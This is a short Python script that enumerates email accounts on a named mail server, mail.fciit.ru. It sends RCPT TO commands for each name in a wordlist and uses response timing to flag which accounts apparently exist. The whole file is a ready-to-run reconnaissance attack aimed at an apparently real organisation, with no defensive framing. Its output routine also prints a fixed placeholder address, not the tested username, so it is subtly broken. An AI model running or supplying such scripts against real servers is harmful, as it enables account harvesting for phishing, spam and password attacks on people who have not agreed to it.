import smtplib
import time

green_color = "\033[92m"
reset_color = "\033[0m"

def print_result(result_time, to_address, response_code, response_message):
    if result_time < 4:
        print(f'{green_color}[+] {to_address} - {result_time}')
        print(f"{response_code} {response_message} {reset_color}")
        print('-----------------------------------------')
    else:
        print(f'[-] {to_address} - {result_time}')
        print(f"{response_code} {response_message}")
        print('-----------------------------------------')

def start_enum():
    smtp_server = 'mail.fciit.ru'
    smtp_port = 25

    from_address = 'ya@fciit.com'
    to_address = 'qwezxcasd@fciit.ru'

    server = smtplib.SMTP(smtp_server, smtp_port)

    helo_command = 'helo ya.ru'
    mail_command = f'MAIL FROM:<{from_address}>'
    
    with open("users.txt") as file:  
        users = file.readlines()
    
    for user in users:
        user = user.replace("\n", "")
        rcpt_command = f'RCPT TO:<{user}@fciit.ru>'

        server.docmd(helo_command)
        server.docmd(mail_command)
        start_time = time.time()
        response_code, response_message = server.docmd(rcpt_command)
        end_time = time.time()

        result_time = end_time - start_time

        print_result(result_time, to_address, response_code, response_message)
        

    server.quit()

if __name__ == '__main__':
    start_enum()